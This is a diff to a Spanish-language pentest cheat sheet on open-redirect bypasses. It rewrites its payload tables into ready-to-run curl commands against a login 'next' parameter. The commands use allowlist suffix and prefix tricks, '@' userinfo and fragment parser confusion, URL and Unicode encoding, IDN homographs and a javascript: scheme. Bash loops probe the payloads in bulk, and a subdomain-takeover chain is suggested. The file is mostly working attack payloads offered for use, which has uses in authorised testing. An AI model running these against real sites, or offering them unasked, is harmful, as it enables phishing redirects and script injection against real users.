@@ -21,111 +21,93 @@ linked:
 
 ## Whitelist Domain Match
 
-| **Validation** | **Bypass payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `startsWith("https://target.com")` | `https://target.com.attacker.com` | Suffix attacker. |
-| `endsWith("target.com")` | `https://attacker-target.com` | Prefix attacker. |
-| `contains("target.com")` | `https://attacker.com/?x=target.com` | Substring anywhere. |
-| Regex `target\.com` (sin anchor) | `https://attacker.com/target.com.html` | No `^$` anchors. |
-| Regex `^https://target\.com` (sin terminator) | `https://target.com.attacker.com` | Sufijo. |
-| Regex `target\.com$` | `https://target.com@attacker.com` | userinfo + suffix legit. |
-| `parseUrl(input).host == "target.com"` con buggy parser | `https://target.com@attacker.com` | Some parsers parsean wrong. |
-| Substring `target.com` | `https://attackertarget.com` | Composed domain. |
-| `.endsWith("target.com")` | `https://eviltarget.com` | Eviltarget owns it. |
-| Allowlist con subdomain wildcard | `https://attacker.target.com.evil.com` | Subdomain prefix abuse. |
-| Validation strip protocol | `target.com\\@attacker.com` | After strip → ambiguous. |
-| Validation only HTTP/HTTPS | `javascript:alert(1)` | Skip http/https check. |
-| Validation only blacklist scheme | `Vbscript:msgbox(1)` | Less common scheme. |
-| Lowercase only | `HtTpS://target.com.evil.com` | Case bypass del filter. |
+| `curl -sI "https://target/login?next=https://target.com.attacker.com"` | Bypass startsWith con suffix | Validator `startsWith("https://target.com")`. |
+| `curl -sI "https://target/login?next=https://eviltarget.com"` | Bypass endsWith con prefix | Validator `endsWith("target.com")`. |
+| `curl -sI "https://target/login?next=https://attacker.com/?x=target.com"` | Substring match — target en query | Validator `contains("target.com")`. |
+| `curl -sI "https://target/login?next=https://attacker.com/target.com.html"` | Regex sin anchor — target en path | Regex `target\.com` sin `^$`. |
+| `curl -sI "https://target/login?next=https://target.com@attacker.com"` | Userinfo bypass — target en userinfo | Regex `target\.com$` o parser confused. |
+| `curl -sI "https://target/login?next=https://attackertarget.com"` | Composed domain | Substring filter naive. |
+| `curl -sI "https://target/login?next=https://attacker.target.com.evil.com"` | Subdomain prefix abuse | Allowlist con wildcard mal aplicada. |
+| `curl -sI "https://target/login?next=HtTpS://target.com.evil.com"` | Mixed case scheme | Filter case-sensitive. |
+| `curl -sI "https://target/login?next=javascript:alert(1)"` | Scheme bypass | Validator solo chequea http/https. |
 ^or-bypass-whitelist
 
 ___
 
 ## URL Parser Confusion (`@`, `#`, `?`)
 
-| **Payload** | **Resultado parsing** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `https://target.com@attacker.com` | Userinfo `target.com`, host `attacker.com` | Standard userinfo. |
-| `https://target.com:80@attacker.com` | Userinfo con port-like | Same idea. |
-| `https://attacker.com#@target.com` | Host `attacker.com`, fragment `@target.com` | Fragment confusion. |
-| `https://attacker.com#target.com` | Fragment de target.com | Browser navigates to attacker. |
-| `https://attacker.com?target.com` | Query `target.com` | Same as fragment. |
-| `https://attacker.com\\@target.com` | Backslash split before @ | Some parsers. |
-| `https://target.com\@attacker.com` | Backslash before @ | Inconsistent parsing. |
-| `https://target.com.attacker.com#@target.com` | Multi-trick | Combine. |
-| `https://target.com.@attacker.com` | Trailing dot before @ | DNS root. |
-| `//target.com:@attacker.com` | Empty password trick | Same as userinfo. |
-| `https://attacker.com/.target.com` | Path includes target | Whitelist substring. |
-| URL-encoded `@` | `https://target.com%40attacker.com` | After decode = `@`. |
-| Doble URL-encoded `@` | `https://target.com%2540attacker.com` | Multi-decode parsers. |
-| `https://target.com@attacker.com` | Unicode escape | If parser lo procesa. |
+| `curl -sI "https://target/login?next=https://target.com@attacker.com"` | Userinfo `target.com`, host real `attacker.com` | Standard userinfo trick. |
+| `curl -sI "https://target/login?next=https://target.com:80@attacker.com"` | Userinfo con port-like prefix | Parser ignora userinfo+port. |
+| `curl -sI "https://target/login?next=https://attacker.com#@target.com"` | Host attacker, fragment `@target.com` | Fragment confusion. |
+| `curl -sI "https://target/login?next=https://attacker.com?target.com"` | Query string trick | Validator parsea query como host. |
+| `curl -sI "https://target/login?next=https://target.com\\\\@attacker.com"` | Backslash split antes de `@` | Parser inconsistencia. |
+| `curl -sI "https://target/login?next=https://target.com.@attacker.com"` | Trailing dot DNS root | Parser confusion. |
+| `curl -sI "https://target/login?next=https://target.com%40attacker.com"` | URL-encoded `@` | Decode-after-validate. |
+| `curl -sI "https://target/login?next=https://target.com%2540attacker.com"` | Doble URL-encoded `@` | Multi-decode parser. |
+| `for trick in 'target.com@attacker.com' 'attacker.com#@target.com' 'target.com\\@attacker.com' 'target.com:80@attacker.com'; do curl -sI "https://target/login?next=https://$trick" \| grep -i location; done` | Bulk parser-confusion probe | Discovery. |
 ^or-bypass-parser
 
-### URL parser inconsistencies
+### URL parser inconsistencies (referencia)
 
 | Component | Browser parses as | Backend parses as |
 |---|---|---|
-| `https://a@b/path` | host=b | varies — some treat as `a` host |
+| `https://a@b/path` | host=b | varies — some treat `a` as host |
 | `https://a/b@c` | host=a, path=`/b@c` | varies |
-| `https://a\\b` | varies — Chrome=a, FF=path `\\b` | varies |
-| `https://a#b@c` | host=a, fragment `b@c` | varies — some strip fragment first |
+| `https://a\\b` | Chrome=host=a, FF=path `\\b` | varies |
+| `https://a#b@c` | host=a, fragment `b@c` | varies (some strip fragment) |
 
 ___
 
 ## Subdomain Prefix/Suffix Abuse
 
-| **Validation** | **Bypass** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `*.target.com` allowed | Atacante registra subdomain | Exact wildcard match. |
-| `target.com.attacker.com` | Suffix de attacker | Common bypass. |
-| `attacker-target.com` | Atacante registra similar TLD | Lookalike domain. |
-| `xn--target-...` | IDN homoglyph | Cyrillic chars. |
-| `target.com.` (trailing dot) | DNS root indication | Some parsers. |
-| `target.attacker.com` | Subdomain de atacante | Subdomain abuse. |
-| `tаrget.com` (Cyrillic а) | IDN spoofing | Visual identical. |
-| `target.com@attacker.com` | Userinfo trick | See Parser Confusion. |
-| `attacker.com/target.com` | Path includes target | Substring filter. |
-| `target.com.evil.com` con `.evil.com` whitelist | Suffix bypass | Whitelist mal config. |
-| `target.com#.attacker.com` | Fragment trick | Hash as separator. |
-| `subdomain.target.com.attacker.com` | Multi-segment trick | Compound. |
-| `target.com.localhost` | Local TLD | `.localhost` abuse. |
+| Registrar `attacker-target.com` (lookalike TLD) + `curl -sI "https://target/login?next=https://attacker-target.com"` | Lookalike domain bypass | Validator regex naive. |
+| `curl -sI "https://target/login?next=https://target.com.attacker.com"` | Suffix attacker.com con target en hostname | Validator solo chequea contains. |
+| Registrar Cyrillic `tаrget.com` (xn--trget-...) + probe | IDN homograph spoofing | Validator ASCII-only. |
+| `curl -sI "https://target/login?next=https://target.com."` (trailing dot) | DNS root indication bypass | Parser inconsistente. |
+| `curl -sI "https://target/login?next=https://target.attacker.com"` | Subdomain de atacante | Subdomain abuse. |
+| `curl -sI "https://target/login?next=https://attacker.com/target.com"` | Path incluye target | Substring filter. |
+| Si `*.target.com` allowed: tomar control de subdomain dangling con subjack/nuclei → setear redirect | Subdomain takeover chain | Wildcard whitelist + dangling subdomain. |
 ^or-bypass-subdomain
 
 ___
 
 ## Encoding Tricks (URL / Unicode)
 
-| **Encoding** | **Payload** | **Decoded** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| URL-encoded slash | `%2F%2Fattacker.com` | `//attacker.com` |
-| Doble URL-encoded slash | `%252F%252Fattacker.com` | (after double decode) `//attacker.com` |
-| URL-encoded protocol | `https%3A%2F%2Fattacker.com` | `https://attacker.com` |
-| Mixed encoded | `https:%2F%2Fattacker.com` | `https://attacker.com` |
-| URL-encoded backslash | `%5C%5Cattacker.com` | `\\attacker.com` |
-| Unicode encoded slash | `//attacker.com` | `//attacker.com` (in JSON contexts). |
-| UTF-7 encoded | `+ADwAaAB0AHQAcA==://...` | UTF-7 decoded URL. |
-| Punycode IDN | `xn--ttacker-...` | Visual lookalike domain. |
-| Unicode normalization | `target.com` (visual) → `target.com` (NFC) | Lookalike chars. |
-| Hex encoded | `\x68\x74\x74\x70\x73://attacker.com` | If reflected en JS. |
-| Base64 (in custom contexts) | `aHR0cHM6Ly9hdHRhY2tlci5jb20=` | Decoded URL. |
-| Mixed case scheme | `hTtPs://attacker.com` | Case-insensitive scheme. |
-| Whitespace tricks | `https://attacker.com %20` | Trailing space. |
-| Tabs | `https://attacker.com\t` | Trailing tab. |
-| Right-to-left override | `‮attacker.com` | Visual spoofing. |
+| `curl -sI "https://target/login?next=%2F%2Fattacker.com"` | URL-encoded `//attacker.com` | Decode-after-validate. |
+| `curl -sI "https://target/login?next=%252F%252Fattacker.com"` | Doble URL-encoded slashes | Multi-pass decode parser. |
+| `curl -sI "https://target/login?next=https%3A%2F%2Fattacker.com"` | URL-encoded protocol completo | Validator con regex sobre raw value. |
+| `curl -sI "https://target/login?next=https:%2F%2Fattacker.com"` | Mixed encoded | Partial decode. |
+| `curl -sI "https://target/login?next=%5C%5Cattacker.com"` | URL-encoded backslashes | Combo encoding + backslash trick. |
+| Probar IDN punycode: `curl -sI "https://target/login?next=https://xn--attacker-..."` | Punycode IDN spoofing | Validator no decodifica IDN. |
+| `curl -sI "https://target/login?next=hTtPs://attacker.com"` | Mixed case scheme | Validator case-sensitive. |
+| `curl -sI "https://target/login?next=https://attacker.com%20"` (trailing whitespace) | Whitespace trim varies | Backend strip diferente al browser. |
+| `curl -sI "https://target/login?next=$(printf '‮attacker.com' \| jq -sRr @uri)"` | RTL override Unicode visual spoofing | Display-based phishing. |
 ^or-bypass-encoding
 
-### Combinaciones útiles
+### Combos multi-capa
 
-```
-# Bypass multi-layer:
-?next=//target.com.attacker.com         # Suffix + protocol-relative
-?next=https://target.com@attacker.com   # Userinfo trick
-?next=//attacker.com\@target.com        # Backslash + @ confusion
-?next=javascript%3Aalert(1)             # URL-encoded scheme
-?next=//attacker.com%23target.com       # Encoded fragment
-?next=%2F%2Fattacker.com%3Ftarget.com   # Multi-encoded
-?next=//attacker%2Ecom                  # Encoded dot in domain
-?next=//xn--ttacker-...                 # Punycode IDN
+```bash
+# Bypass multi-layer probe set
+for p in '//target.com.attacker.com' \
+         'https://target.com@attacker.com' \
+         '//attacker.com\@target.com' \
+         'javascript%3Aalert(1)' \
+         '//attacker.com%23target.com' \
+         '%2F%2Fattacker.com%3Ftarget.com' \
+         '//attacker%2Ecom' \
+         '//xn--attacker-...' ; do
+  ENC=$(printf '%s' "$p" | jq -sRr @uri)
+  echo "=== $p ==="
+  curl -sI "https://target/login?next=$ENC" | grep -i location
+done
 ```
 
 ***
